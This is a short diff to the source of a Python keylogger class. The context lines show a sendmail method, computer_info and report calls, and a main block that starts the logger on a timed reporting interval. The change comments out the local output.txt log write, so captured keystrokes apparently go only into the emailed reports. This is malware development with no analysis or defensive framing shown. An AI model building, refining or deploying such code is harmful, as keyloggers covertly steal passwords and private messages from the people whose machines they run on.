@@ -34,8 +34,8 @@ class Keylogger:
                 name = f"[{name.upper()}]"
 
         self.log += name
-        with open("output.txt", "w+") as output:
-            output.write(self.log)
+        # with open("output.txt", "w+") as output:
+        #   output.write(self.log)
 
     @staticmethod
     def sendmail(email, password, message):
@@ -105,6 +105,7 @@ class Keylogger:
         self.computer_info()
         self.report()
         self.semaphore.acquire()
+
 
 if __name__ == "__main__":
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
